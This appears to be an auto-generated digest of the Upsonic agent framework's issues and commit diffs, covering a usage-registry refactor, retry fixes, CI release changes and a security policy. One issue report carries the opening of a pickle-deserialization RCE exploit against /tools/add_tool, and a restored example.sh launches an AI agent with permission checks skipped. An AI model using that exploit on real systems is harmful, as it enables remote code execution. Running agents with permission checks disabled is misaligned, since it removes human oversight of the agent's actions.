  *Symptoms*: **Describe the bug** When I used the route_weather_check.py from the browser-use directory in the cookbook for testing, I found that browser-use became unresponsive when handling the login request. After closing the route_weather_check.py test task in the console, the backend browser process kept running and could not be completely terminated. I hope a task timeout mechanism can be added, and that when the frontend task is closed, a signal can be sent to the backend task to exit. **To Reproduce** Steps to reproduce the behavior: 1. Use this code: ```python from upsonic import Agent, Task, ObjectResponse from upsonic.client.tools import BrowserUse # Importing BrowserUse import os os.environ["UPSONIC_TELEMETRY"] = "False" route_weather_agent = Agent("Route Weather Checker", model="openai/gpt-4.1-mini", reflection=True) #If you yuse to Azure please do model="azure/gpt-4o"   # Define response format for creating route class Route(ObjectResponse):     cities_between_two_cities: list[str]  # Define response format for weather  class RouteWeather(ObjectResponse):     drive_route: list[str]     cities_temperature: list[str]     cities_condition: list[str]   # Change `starting_city` and `destination_city` to customize the route. starting_city = "San Francisco" destination_city= "Santa Cruz"  # Task to find for cities between two city most fastly route using Browser Use route_task = Task(     "Find all cities between two cities the fastly driving route.",     tools=[BrowserUse],     re
  **Post-Mortem & Fix Analysis**:
  > Hello, thanks for opening this. Since Upsonic went through multiple transitions (GCA to early Upsonic to current version), many older issues and PRs are no longer relevant to the current architecture.  We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #353** (2026-01-28): **[Security] RCE in add_tool Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in add_tool Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  # Summmary  When user is runing Upsonic, attacker via /tools/add_tool to achieve RCE by sending carefully crafted data.  + function call stack:   + add_tool     + cloudpickle.loads(decoded_function)    # POC  ## build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic cp Dockerfile .. ;cd .. sudo docker build -t upsonic_test . ```    ## reproduce  + run: `sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test`    ```   $ sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test      New 'X' desktop is 8c9746dbd78d:1      Starting applications specified in /home/docker/.vnc/xstartup   Log file is /home/docker/.vnc/8c9746dbd78d:1.log      INFO:     Started server process [9]   INFO:     Waiting for application startup.   INFO:     Application startup complete.   INFO:     Uvicorn running on http://localhost:8086 (Press CTRL+C to quit)   INFO:     Started server process [28]   INFO:     Waiting for application startup.   INFO:     Application startup complete.   INFO:     Uvicorn running on http://0.0.0.0:7541 (Press CTRL+C to quit)      ```  + now, run the following script to attack Upsonic:    + cmd:The shell command you want to run on the Upsonic    ```python   import pickle   import base64   import requests   import json   import argparse      class Evil_Data(dict):       def __init__(self, src: str, **kwargs):           super().__init__(**kwa
  **Post-Mortem & Fix Analysis**:
  > Hi @onuratakan ,   I have reported a remote code execution (RCE) vulnerability in the project and provided steps to reproduce and a proof of concept. As this vulnerability may pose a serious security threat to project users, I suggest applying for a **CVE** number for this vulnerability to facilitate tracking and disclosure. I would like to ask if you can assist in submitting a CVE request or if there is a specific process that I need to cooperate with? If additional information or support is required, I am happy to provide it.   Thank you for your attention and support for project security!   Best wishes, 7resp4ss
  > Closing this for the same reason mentioned above. Please refer to the previous comment for details. Thanks.

### D4: Resource Lifecycle & Leak Defenses
- Memory allocation, socket lifecycle, and handle cleanup observed from bug fixes and PR deltas.

### D5: Boundary Deserialization & Encoding
- Schema deserialization, payload validation, and untrusted input guards.

### D6: Cross-Platform & Runtime Gotchas
- Platform variance, OS-specific gotchas, and environment discrepancies detected in issue reports.

### D7: Build, CI/CD, Deployment & Tooling
- Toolchain requirements, dependencies, and packaging specs verified against remote manifests.

### D8: Forensic Bug Fixes & Real Production Code Patches
Observed empirical fixes and code patches:

### Incident Patch 1: `655c4d30` (2026-06-15)
**Commit Message**: Merge pull request #615 from Upsonic/add-security-policy

docs: add SECURITY.md with responsible disclosure policy

**File**: `SECURITY.md` (added, +35/-0)
```diff
@@ -0,0 +1,35 @@
+# Security Policy
+
+## Responsible Disclosure
+
+If you believe you have found a security vulnerability in Upsonic Platform, please report it to `security@upsonic.co`.
+
+Please include:
+
+- A clear description of the issue and its impact.
+- Steps to reproduce the behavior.
+- Any proof-of-concept code, requests, or screenshots that help us validate the report.
+- Your preferred contact information for follow-up.
+
+## Scope
+
+This policy covers security vulnerabilities in this repository and the software it ships.
+
+Please do not use public issues, pull requests, or other public channels for vulnerability reports.
+
+## Response Expectations
+
+We will acknowledge receipt of a report within 7 business days.
+
+We aim to investigate validated reports promptly and target coordinated disclosure within 90 days, depending on severity and remediation complexity.
+
+## Researcher Expectations
+
+Please act in good faith and avoid:
+
+- Accessing, modifying, or deleting data that does not belong to you.
+- Disrupting service availability or degrading the experience for other users.
+- Using social engineering, spam, or physical attacks.
+- Publicly disclosing a vulnerability before we have had a reasonable opportunity to investigate and remediate it.
+
+We will treat good-faith security research intended to improve the safety of our systems as responsible disclosure.
```

---

### Incident Patch 2: `eca02d43` (2026-06-15)
**Commit Message**: docs: add SECURITY.md with responsible disclosure policy

**File**: `SECURITY.md` (added, +35/-0)
```diff
@@ -0,0 +1,35 @@
+# Security Policy
+
+## Responsible Disclosure
+
+If you believe you have found a security vulnerability in Upsonic Platform, please report it to `security@upsonic.co`.
+
+Please include:
+
+- A clear description of the issue and its impact.
+- Steps to reproduce the behavior.
+- Any proof-of-concept code, requests, or screenshots that help us validate the report.
+- Your preferred contact information for follow-up.
+
+## Scope
+
+This policy covers security vulnerabilities in this repository and the software it ships.
+
+Please do not use public issues, pull requests, or other public channels for vulnerability reports.
+
+## Response Expectations
+
+We will acknowledge receipt of a report within 7 business days.
+
+We aim to investigate validated reports promptly and target coordinated disclosure within 90 days, depending on severity and remediation complexity.
+
+## Researcher Expectations
+
+Please act in good faith and avoid:
+
+- Accessing, modifying, or deleting data that does not belong to you.
+- Disrupting service availability or degrading the experience for other users.
+- Using social engineering, spam, or physical attacks.
+- Publicly disclosing a vulnerability before we have had a reasonable opportunity to investigate and remediate it.
+
+We will treat good-faith security research intended to improve the safety of our systems as responsible disclosure.
```

---

### Incident Patch 3: `4dc6f602` (2026-05-19)
**Commit Message**: fix: TECH-1625 centralized usage registry (#602)

* feat(usage-registry): Phase 0 foundation — UsageEntry / AggregatedUsage / UsageRegistry

Adds src/upsonic/usage_registry/ as the in-memory backbone for a single
source of truth for token / cost / timing across Agent, Task, Chat,
Team, Workflow, and system (Memory / Reliability) execution scopes.

- UsageEntry: append-only ledger row tagged with any subset of
  chat/agent/task/team/workflow/system_usage_id. Idempotent by entry_id
  — re-recording the same id replaces (not double-counts), removing the
  need for the baseline/snapshot/subtract arithmetic TaskUsage uses
  today to survive retries.
- AggregatedUsage: read-only roll-up; shape mirrors TaskUsage so
  Phase 3 read-through wrappers drop in without changing callers.
- UsageRegistry: thread-safe dict keyed by entry_id, scope filtering
  with AND semantics, convenience by_chat/by_agent/by_task/by_team/
  by_workflow shortcuts.
- new_usage_id(scope): uuid4 with a scope prefix for readable logs.
- get_default_registry(): process-wide singleton for in-memory mode.

No integration with existing usage.py yet — this commit only adds new
code paths. 31 unit tests cover defaults, tota

**File**: `Docs` (modified, +1/-1)
```diff
@@ -1 +1 @@
-Subproject commit 0bc1d3a55d2876b9be44b552d63b18748b6f1cf7
+Subproject commit bb45ef5bc040558e492cf7ae53a359b4c878624f
```

**File**: `src/upsonic/agent/agent.py` (modified, +151/-288)
```diff
@@ -248,6 +248,7 @@ def __init__(
         context_management_model: Optional[str] = None,
         reliability_layer: Optional[Any] = None,
         agent_id_: Optional[str] = None,
+        agent_usage_id: Optional[str] = None,
         canvas: Optional["Canvas"] = None,
         retry: int = 1,
         mode: RetryMode = "raise",
@@ -391,7 +392,8 @@ def __init__(
 
         self.name = name
         self.agent_id_ = agent_id_
-        
+        self._agent_usage_id = agent_usage_id
+
         # Session/user overrides
         self._override_session_id = session_id
         self._override_user_id = user_id
@@ -578,8 +580,6 @@ def __init__(
         self._tool_call_count = 0
         self._tool_limit_reached = False
         
-        # Agent-level accumulated usage across all tasks
-        self.usage: Optional["AgentUsage"] = None
         
         # Run cancellation tracking
         self.run_id: Optional[str] = None
@@ -779,7 +779,31 @@ def agent_id(self) -> str:
         if self.agent_id_ is None:
             self.agent_id_ = str(uuid.uuid4())
         return self.agent_id_
-    
+
+    @property
+    def agent_usage_id(self) -> str:
+        """Stable id used by the usage registry to tag every ledger entry
+        produced by this agent. Lazily generated; distinct from
+        :attr:`agent_id` so callers can scope usage across many agents that
+        share the same logical agent_id (e.g. recreated per-request)."""
+        if self._agent_usage_id is None:
+            from upsonic.usage_registry import new_usage_id
+            self._agent_usage_id = new_usage_id("agent")
+        return self._agent_usage_id
+
+    @property
+    def usage(self) -> Any:
+        """Aggregated token / cost / timing for every ledger entry
+        recorded under this agent's scope.
+
+        Returns an :class:`AggregatedUsage` view derived from the
+        usage registry. Shape is API-compatible with the previous
+        ``AgentUsage`` (input_tokens, output_tokens, requests, cost,
+        duration, ...) so callers don't need to know it's now derived.
+        """
+        from upsonic.usage_registry import get_default_registry
+        return get_default_registry().by_agent(self.agent_usage_id)
+
     @property
     def session_id(self) -> Optional[str]:
         """Get session_id from override, memory, or db."""
@@ -885,56 +909,6 @@ async def aget_session_usage(self) -> "TaskUsage":
 
         return TaskUsageCls()
 
-    @property
-    def cost(self) -> Optional[Dict[str, Any]]:
-        """
-        Aggregated token usage and estimated cost across every task this
-        agent has executed.
-
-        Mirrors the shape of :meth:`Task.get_total_cost` but accumulates
-        across all ``do`` / ``do_async`` / ``run`` / ``run_async`` calls
-        on this agent instance. Autonomous agents (and prebuilts like
-        :class:`AppliedScientist`) frequently dispatch several tasks per
-        run — bootstrap, workspace greeting, the user's prompt, internal
-        sub-agents — so ``autonomous_agent.cost`` reports the full session
-        spend, not just the last task.
-
-        Returns:
-            Dict with ``input_tokens``, ``output_tokens``, ``total_tokens``,
-            ``estimated_cost`` (USD), ``requests``, ``tool_calls``,
-            ``cache_read_tokens``, ``cache_write_tokens``, and
-            ``reasoning_tokens``. ``estimated_cost`` is ``None`` when the
-            model's pricing cannot be resolved. Returns ``None`` if no
-            tasks have been executed yet.
-        """
-        usage = self.usage
-        if usage is None:
-            return None
-
-        input_tokens: int = usage.input_tokens or 0
-        output_tokens: int = usage.output_tokens or 0
-
-        estimated_cost: Optional[float] = usage.cost
-        if estimated_cost is None:
-            try:
-                from upsonic.utils.usage import calculate_cost_from_usage
-                model = self.model or self.model_name
-                if model is not None:
-                    estimated_cost = calculate_cost_from_usage(usage, model)
-            except Exception:
-                estimated_cost = None
-
-        return {
-            "input_tokens": input_tokens,
-            "output_tokens": output_tokens,
-            "total_tokens": input_tokens + output_tokens,
-            "estimated_cost": float(estimated_cost) if estimated_cost is not None else None,
-            "requests": usage.requests,
-            "tool_calls": usage.tool_calls,
-            "cache_read_tokens": usage.cache_read_tokens,
-            "cache_write_tokens": usage.cache_write_tokens,
-            "reasoning_tokens": usage.reasoning_tokens,
-        }
 
     def _create_agent_run_input(self, task: "Task") -> AgentRunInput:
         """
@@ -2409,13 +2383,12 @@ async def _execute_tool_calls(self, tool_calls: List["ToolCallPart"]) -> List["T
                     tool_call_info=tool_call_info,
                     check_type="Post-Executio
```

**File**: `src/upsonic/agent/context_managers/call_manager.py` (modified, +1/-12)
```diff
@@ -52,11 +52,7 @@ async def afinalize(self) -> None:
             self.start_time = self.end_time
 
     async def alog_completion(self, context: "AgentRunOutput") -> None:
-        """Log the completion with usage tracking, Tool Calls, LLM Result, and Task Metrics.
-
-        This is the single printing entry-point for completed runs.
-        It calls ``call_end`` (which prints Tool Calls + LLM Result
-        and tracks price_id) and then ``print_price_id_summary`` (Task Metrics).
+        """Log the completion with usage tracking, Tool Calls and LLM Result.
 
         Args:
             context: AgentRunOutput object containing messages and output.
@@ -110,17 +106,10 @@ async def alog_completion(self, context: "AgentRunOutput") -> None:
             usage,
             tool_usage_result,
             self.debug,
-            getattr(self.task, 'price_id', None),
             print_output=self.print_output,
             show_tool_calls=self.show_tool_calls,
         )
 
-        if self.task and not getattr(self.task, 'not_main_task', False):
-            from upsonic.utils.printing import print_price_id_summary, price_id_summary
-            price_id: Optional[str] = getattr(self.task, 'price_id', None)
-            if price_id and price_id in price_id_summary:
-                print_price_id_summary(price_id, self.task, print_output=self.print_output)
-
     def prepare(self) -> None:
         """Synchronous version of aprepare."""
         import asyncio
```

**File**: `src/upsonic/agent/context_managers/context_manager.py` (modified, +2/-5)
```diff
@@ -287,11 +287,8 @@ def get_context_summary(self) -> Dict[str, Any]:
                 "not_main_task": self.task.not_main_task,
                 "start_time": self.task.start_time,
                 "end_time": self.task.end_time,
-                "duration": self.task.duration,
-                "price_id": self.task.price_id,
-                "total_cost": self.task.total_cost,
-                "total_input_tokens": self.task.total_input_token,
-                "total_output_tokens": self.task.total_output_token,
+                "duration": self.task.usage.duration,
+                "task_usage_id": self.task.task_usage_id,
                 "tool_calls_count": len(self.task.tool_calls) if self.task.tool_calls else 0,
                 "query_knowledge_base": self.task.query_knowledge_base
             },
```

**File**: `src/upsonic/agent/context_managers/system_prompt_manager.py` (modified, +4/-7)
```diff
@@ -416,16 +416,13 @@ async def aprepare(
         Args:
             memory_handler: Optional MemoryManager for memory and culture injection
         """
-        # Prepare culture if needed (async) - must be done before _build_system_prompt
+        # Prepare culture if needed (async) - must be done before _build_system_prompt.
+        # Culture's own LLM call already lands in the usage registry under
+        # the active agent_usage_id / task_usage_id; no manual roll-up onto
+        # the parent's run output is needed.
         if self.agent._culture_manager and self.agent._culture_manager.enabled:
             if not self.agent._culture_manager.prepared:
                 await self.agent._culture_manager.aprepare()
-            
-            # Drain culture extraction LLM usage into parent agent's run output
-            if hasattr(self.agent, '_agent_run_output') and self.agent._agent_run_output:
-                culture_usage = self.agent._culture_manager.drain_accumulated_usage()
-                if culture_usage:
-                    self.agent._agent_run_output.usage.incr(culture_usage)
         
         # Build system prompt (culture will be injected in _build_system_prompt if prepared)
         self.system_prompt = self._build_system_prompt(memory_handler)
```

**File**: `src/upsonic/agent/pipeline/manager.py` (modified, +4/-4)
```diff
@@ -155,8 +155,8 @@ def _handle_cancellation(
         if not cancelled_step_result:
             cancelled_step_result = output.get_cancelled_step()
 
-        # Stop the usage timer and mark paused so _finalize_agent_usage
-        # doesn't double-count and duration is preserved for resume.
+        # Stop the usage timer and mark paused so the run-state knows
+        # to resume cleanly; duration is preserved for the resume path.
         if self.task:
             self.task.is_paused = True
             if hasattr(self.task, '_usage') and self.task._usage is not None:
@@ -202,8 +202,8 @@ def _handle_durable_execution_error(
         if not failed_step_result:
             failed_step_result = output.get_error_step()
 
-        # Stop the usage timer and mark paused so _finalize_agent_usage
-        # doesn't double-count and duration is preserved for resume.
+        # Stop the usage timer and mark paused so the run-state knows
+        # to resume cleanly; duration is preserved for the resume path.
         if self.task:
             self.task.is_paused = True
             if hasattr(self.task, '_usage') and self.task._usage is not None:
```

**File**: `src/upsonic/agent/pipeline/steps.py` (modified, +41/-55)
```diff
@@ -175,14 +175,6 @@ async def execute(self, context: "AgentRunOutput", task: "Task", agent: "Agent",
             cached_response = await task.get_cached_response(input_text, model)
             
             # Propagate sub-agent usage from cache LLM comparison (if any)
-            cache_mgr = getattr(agent, '_cache_manager', None)
-            if cache_mgr is not None:
-                cache_llm_usage = getattr(cache_mgr, '_last_llm_usage', None)
-                if cache_llm_usage is not None:
-                    usage = context._ensure_usage()
-                    usage.incr(cache_llm_usage)
-                    cache_mgr._last_llm_usage = None
-            
             if cached_response is not None:
                 similarity = None
                 cache_key = None
@@ -1828,16 +1820,16 @@ async def execute(self, context: "AgentRunOutput", task: "Task", agent: "Agent",
         finally:
             # Always update usage from model response if available (even on error/cancel)
             # This ensures usage is tracked for durable execution recovery
-            if response is not None and hasattr(response, 'usage') and response.usage:
-                try:
-                    context._ensure_usage().incr(response.usage)
-                    
-                    from upsonic.utils.usage import calculate_cost_from_usage
-                    cost_value = calculate_cost_from_usage(response.usage, model)
-                    context.set_usage_cost(cost_value)
-                except Exception:
-                    pass
-            
+            if response is not None:
+                from upsonic.usage_registry import record_response_usage
+                record_response_usage(
+                    response,
+                    model=model,
+                    pipeline_step="model_call",
+                    model_execution_time=model_execution_time,
+                    run_output=context,
+                )
+
             if step_result:
                 self._finalize_step_result(step_result, context)
             
@@ -2036,10 +2028,9 @@ async def execute(self, context: "AgentRunOutput", task: "Task", agent: "Agent",
                 context.output
             )
             
-            # Aggregate sub-agent usage from reflection into parent context
-            if reflection_result.sub_agent_usage is not None:
-                usage = context._ensure_usage()
-                usage.incr(reflection_result.sub_agent_usage)
+            # Reflection's sub-agent LLM calls already land in the usage
+            # registry under the parent's scope tags (inherited via
+            # contextvars), so no manual roll-up onto the run snapshot.
             
             # Extract values from ReflectionResult
             improved_output = reflection_result.improved_output
@@ -2568,12 +2559,10 @@ async def execute(self, context: "AgentRunOutput", task: "Task", agent: "Agent",
             finally:
                 await reliability_manager.afinalize()
 
-            # Aggregate sub-agent usage from reliability layer into parent context
-            reliability_usage = getattr(task, '_reliability_sub_agent_usage', None)
-            if reliability_usage is not None:
-                usage = context._ensure_usage()
-                usage.incr(reliability_usage)
-                task._reliability_sub_agent_usage = None
+            # Reliability layer's validator / editor sub-agents inherit
+            # the parent's scope tags via contextvars, so their LLM usage
+            # is already in the registry; just clear the staging field.
+            task._reliability_sub_agent_usage = None
 
             modifications_made = str(original_output) != str(context.output)
             
@@ -2714,12 +2703,10 @@ async def execute(self, context: "AgentRunOutput", task: "Task", agent: "Agent",
                 iteration += 1
                 
                 processed_task, feedback_message = await agent._apply_agent_policy(task, context)
-                
-                # Drain and aggregate sub-agent usage from agent policy LLM calls
-                agent_policy_usage = agent.agent_policy_manager.drain_accumulated_usage()
-                if agent_policy_usage is not None:
-                    usage = context._ensure_usage()
-                    usage.incr(agent_policy_usage)
+
+                # Agent-policy LLM calls inherit the parent's scope tags
+                # and land in the usage registry directly; no roll-up
+                # onto the run snapshot is needed.
                 
                 if agent.debug and agent.debug_level >= 2:
                     from upsonic.utils.printing import debug_log_level2
@@ -2830,15 +2817,15 @@ async def _rerun_model_with_feedback(self, context: "AgentRunOutput", task: "Tas
         )
         _policy_model_elapsed: float = time.time() - _policy_model_start
         context.add_model_execution_time(_policy_model_elapsed)
-        
-        if hasattr(respo
```

**File**: `src/upsonic/agent/policy_manager.py` (modified, +0/-30)
```diff
@@ -471,36 +471,6 @@ def setup_policy_models(self, model) -> None:
                 model=model
             )
     
-    def drain_accumulated_usage(self) -> Optional["RunUsage"]:
-        """Drain and return accumulated sub-agent usage from all LLM providers used by policies.
-        
-        Returns:
-            Aggregated RunUsage from all policy LLM calls, or None if no usage.
-        """
-        from upsonic.usage import RunUsage
-        aggregated: Optional[RunUsage] = None
-        
-        # Drain feedback LLM usage
-        if self._feedback_llm is not None:
-            feedback_usage = self._feedback_llm.drain_accumulated_usage()
-            if feedback_usage is not None:
-                if aggregated is None:
-                    aggregated = RunUsage()
-                aggregated.incr(feedback_usage)
-        
-        # Drain usage from individual policy LLM providers
-        for policy in self.policies:
-            for attr_name in ('base_llm', 'text_finder_llm'):
-                llm_provider = getattr(policy, attr_name, None)
-                if llm_provider is not None and hasattr(llm_provider, 'drain_accumulated_usage'):
-                    provider_usage = llm_provider.drain_accumulated_usage()
-                    if provider_usage is not None:
-                        if aggregated is None:
-                            aggregated = RunUsage()
-                        aggregated.incr(provider_usage)
-        
-        return aggregated
-    
     def __repr__(self) -> str:
         """String representation of the policy manager."""
         policy_names = [p.name for p in self.policies]
```

---

### Incident Patch 4: `12f3ac2e` (2026-05-16)
**Commit Message**: fix(chat,messages): tolerate trailing junk in tool args and reset task on retry (#597) (#598)

- ToolCallPart.args_as_dict() now falls back to JSONDecoder.raw_decode when
  pydantic_core.from_json sees trailing characters, so providers that append
  harmony-format tokens after the JSON args (e.g. Gemma 4 via OpenRouter) no
  longer crash the streaming pipeline.

- Chat retry paths (_invoke_blocking_async, _stream_with_retry,
  _stream_events_with_retry) now reset task.status/run_id before each retry
  attempt, mirroring do_async's internal behavior. Previously the previous
  attempt's mark_completed leaked onto the task and the next attempt tripped
  _validate_task_for_new_run with "Task is already completed", silently
  swallowing the retry.

Co-authored-by: Claude Opus 4.7 (1M context) <[REDACTED_EMAIL]>

**File**: `src/upsonic/chat/chat.py` (modified, +27/-3)
```diff
@@ -770,7 +770,18 @@ async def _invoke_blocking_async(
         """Handle blocking invocation."""
         from upsonic.run.agent.output import AgentRunOutput as AgentRunOutputConcrete
 
+        attempt_counter = {"n": 0}
+
         async def _execute() -> Union[str, InvokeResult]:
+            if attempt_counter["n"] > 0:
+                # Reset task state so the next attempt is treated as a fresh
+                # run. Without this, do_async's _validate_task_for_new_run
+                # would short-circuit with "Task is already completed" once
+                # the previous attempt's pipeline marked the task.
+                task.status = None
+                task.run_id = None
+            attempt_counter["n"] += 1
+
             if self.debug and self.debug_level >= 2:
                 from upsonic.utils.printing import debug_log_level2
                 debug_log_level2(
@@ -782,7 +793,7 @@ async def _execute() -> Union[str, InvokeResult]:
                     user_id=self.user_id,
                     task_description=task.description[:300] if task.description else None,
                 )
-            
+
             if return_run_output:
                 result = await self.agent.do_async(task, debug=self.debug, return_output=True, **kwargs)
                 if not isinstance(result, AgentRunOutputConcrete):
@@ -837,9 +848,17 @@ async def _execute_streaming() -> AsyncIterator[str]:
         async def _stream_with_retry() -> AsyncIterator[str]:
             last_exception = None
             stream_generator = None
-            
+
             try:
                 for attempt in range(self._retry_attempts + 1):
+                    if attempt > 0:
+                        # Reset task state so the next attempt is treated as a
+                        # fresh run. The previous attempt's pipeline may have
+                        # synced a completed/error status onto the task; without
+                        # this reset, _validate_task_for_new_run would short-
+                        # circuit with "Task is already completed".
+                        task.status = None
+                        task.run_id = None
                     try:
                         stream_generator = _execute_streaming()
                         async for chunk in stream_generator:
@@ -853,7 +872,7 @@ async def _stream_with_retry() -> AsyncIterator[str]:
                             except Exception:
                                 pass
                             stream_generator = None
-                        
+
                         if "context manager is already active" in str(exc):
                             if self.debug:
                                 from upsonic.utils.printing import debug_log
@@ -904,6 +923,11 @@ async def _stream_events_with_retry() -> AsyncIterator[AgentEvent]:
             
             try:
                 for attempt in range(self._retry_attempts + 1):
+                    if attempt > 0:
+                        # Reset task state so the next attempt is treated as a
+                        # fresh run (see _stream_with_retry for rationale).
+                        task.status = None
+                        task.run_id = None
                     try:
                         stream_generator = _execute_streaming_events()
                         async for event in stream_generator:
```

**File**: `src/upsonic/messages/messages.py` (modified, +8/-1)
```diff
@@ -1278,7 +1278,14 @@ def args_as_dict(self) -> dict[str, Any]:
             return {}
         if isinstance(self.args, dict):
             return self.args
-        args = pydantic_core.from_json(self.args)
+        try:
+            args = pydantic_core.from_json(self.args)
+        except ValueError:
+            # Some providers (e.g. Gemma via OpenRouter with harmony-format
+            # output) append non-JSON trailing tokens after the valid args
+            # object. Recover the leading JSON object and discard the rest.
+            import json as _json
+            args, _ = _json.JSONDecoder().raw_decode(self.args)
         assert isinstance(args, dict), 'args should be a dict'
         return cast(dict[str, Any], args)
 
```

---

### Incident Patch 5: `f0277e82` (2026-05-15)
**Commit Message**: fix(ci): use uv publish instead of pypa action

**File**: `.github/workflows/release.yml` (modified, +1/-3)
```diff
@@ -87,9 +87,7 @@ jobs:
         run: uv build
 
       - name: Publish package to PyPI
-        uses: pypa/gh-action-pypi-publish@cef221092ed1bacb1cc03d23a2d87d1d172e277b # release/v1
-        with:
-          packages-dir: dist/
+        run: uv publish -t ${{ secrets.THE_PYPI_TOKEN }}
 
   notify-slack:
     needs: [release-please, publish]
```

---

### Incident Patch 6: `2d9324ad` (2026-05-15)
**Commit Message**: fix(ci): refresh uv.lock at release and update release-please config

**File**: `.github/workflows/release.yml` (modified, +40/-0)
```diff
@@ -11,6 +11,8 @@ jobs:
       contents: write
       pull-requests: write
     outputs:
+      pr: ${{ steps.release.outputs.pr }}
+      prs_created: ${{ steps.release.outputs.prs_created }}
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
       version: ${{ steps.release.outputs.version }}
@@ -22,6 +24,44 @@ jobs:
           release-type: python
           target-branch: master
 
+  refresh-lockfile:
+    runs-on: ubuntu-latest
+    needs: release-please
+    if: needs.release-please.outputs.prs_created == 'true'
+    permissions:
+      contents: write
+    env:
+      RELEASE_BRANCH: ${{ fromJSON(needs.release-please.outputs.pr).headBranchName }}
+    steps:
+      - name: Check out release PR branch
+        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
+        with:
+          ref: ${{ env.RELEASE_BRANCH }}
+
+      - name: Set up Python
+        uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6.2.0
+        with:
+          python-version: "3.12"
+
+      - name: Install uv
+        uses: astral-sh/setup-uv@08807647e7069bb48b6ef5acd8ec9567f424441b # v8.1.0
+        with:
+          version: "latest"
+
+      - name: Refresh uv.lock
+        run: uv lock
+
+      - name: Commit refreshed lockfile
+        run: |
+          if git diff --quiet --exit-code -- uv.lock; then
+            exit 0
+          fi
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add uv.lock
+          git commit -m "chore: refresh uv.lock for release PR [skip ci]"
+          git push origin "HEAD:${RELEASE_BRANCH}"
+
   publish:
     runs-on: ubuntu-latest
     needs: release-please
```

**File**: `release-please-config.json` (modified, +3/-1)
```diff
@@ -5,5 +5,7 @@
       "package-name": "upsonic",
       "release-type": "python"
     }
-  }
+  },
+  "include-v-in-tag": true,
+  "bump-minor-pre-major": true
 }
```

**File**: `src/upsonic/__init__.py` (modified, +2/-21)
```diff
@@ -1,34 +1,15 @@
 import importlib
 import os
 import warnings
-from importlib.metadata import PackageNotFoundError, version as get_installed_version
 from pathlib import Path
 from typing import Any
 
+__version__ = "0.76.3" # x-release-please-version
+
 from dotenv import load_dotenv
 
 from upsonic.utils.logging_config import *
 
-
-def _resolve_package_version() -> str:
-    try:
-        return get_installed_version("upsonic")
-    except PackageNotFoundError:
-        pyproject_path = Path(__file__).resolve().parents[2] / "pyproject.toml"
-        if pyproject_path.exists():
-            import re
-            match = re.search(
-                r'^version\\s*=\\s*"(?P<version>[^"]+)"',
-                pyproject_path.read_text(),
-                re.MULTILINE,
-            )
-            if match:
-                return match.group("version")
-        return "0.0.0"
-
-
-__version__ = _resolve_package_version()
-
 warnings.filterwarnings("ignore", category=ResourceWarning)
 warnings.filterwarnings("ignore", category=PendingDeprecationWarning)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
```

---

### Incident Patch 7: `a9e515e3` (2026-05-05)
**Commit Message**: chore(prebuilt): restore legacy template path for backward compatibility

After #580 standardized the prebuilt layout, AppliedScientist's
AGENT_FOLDER points at src/upsonic/prebuilt/applied_scientist/template
in the *current* package. Older pip-installed clients still hard-code
the pre-refactor path "prebuilt_autonomous_agents/applied_scientist"
and run a sparse clone against this repo to fetch templates at runtime.
Removing those files broke those clients with no possible fix on their
end.

Restore the legacy folder as a verbatim duplicate of the canonical
template directory so old sparse-clone calls succeed. Future template
edits should land at src/upsonic/prebuilt/applied_scientist/template/
(canonical) and be mirrored here for as long as we want to keep
supporting the pre-refactor versions.

These files are not packaged into the wheel
(pyproject.toml builds only src/upsonic), so this adds zero overhead
to installs.

Co-Authored-By: Claude Opus 4.7 (1M context) <[REDACTED_EMAIL]>

**File**: `prebuilt_autonomous_agents/applied_scientist/example.sh` (added, +12/-0)
```diff
@@ -0,0 +1,12 @@
+claude \
+  --system-prompt-file "./system_prompt.md" \
+  --dangerously-skip-permissions \
+  --effort "medium" \
+  "New experiment.
+**Research paper:** example_1/tabpfn.pdf
+**Current notebook:** example_1/Baseline XGBoost Adult.ipynb
+**Current data:** downloaded in notebook (ucimlrepo, id=2)
+
+Run the full experiment pipeline. Go from Phase 0 through Phase 5 without stopping. I want to see \`result.md\` at the end telling me whether this new method is better than what we have.
+
+Start now."
\ No newline at end of file
```

**File**: `prebuilt_autonomous_agents/applied_scientist/first_message.md` (added, +15/-0)
```diff
@@ -0,0 +1,15 @@
+New experiment.
+
+**Experiment name:** {research_name}
+**Research source:** {research_source}
+**Current notebook:** {current_notebook}
+**Current data:** {current_data}
+**Experiments directory:** {experiments_directory}
+
+The research source describes the new method to evaluate. It may be a local file (PDF, Markdown, HTML, notebook), a web URL (blog post, arXiv link, documentation page), a git repository URL, or any other reference you can fetch and read. Detect the type at Phase 0 and materialize it inside the experiment folder before reading it (see `skills/experiment_management/SKILL.md`).
+
+Use `{research_name}` **exactly as given** for the experiment folder (`{experiments_directory}/{research_name}/`) and for the `"name"` field in every JSON file — do not rename it, do not add suffixes, do not derive a new one from the source title.
+
+Run the full experiment pipeline. Go from Phase 0 through Phase 5 without stopping. All bookkeeping is JSON — update `progress.json` continuously and, at the end, write `result.json` with the final verdict, summary, and comparison table. No markdown reports.
+
+Start now.
```

**File**: `prebuilt_autonomous_agents/applied_scientist/skills/analyze_current/SKILL.md` (added, +77/-0)
```diff
@@ -0,0 +1,77 @@
+# Analyze Current Skill
+
+## Purpose
+Read and understand the current baseline implementation. Extract all relevant information about the existing approach without modifying anything, and record the analysis as a structured JSON entry.
+
+## When to Use
+Phase 1 — after experiment setup is complete and files are copied to the experiment folder.
+
+## Input
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| experiment_path | path | `experiments/{research_name}/` |
+
+## Actions
+
+1. **Read `{experiment_path}/current.ipynb`** and extract:
+   - Model/algorithm used
+   - Preprocessing steps (encoding, scaling, feature selection, etc.)
+   - Training approach (train/test split ratio, cross-validation, etc.)
+   - Hyperparameters
+   - Metrics used and their values
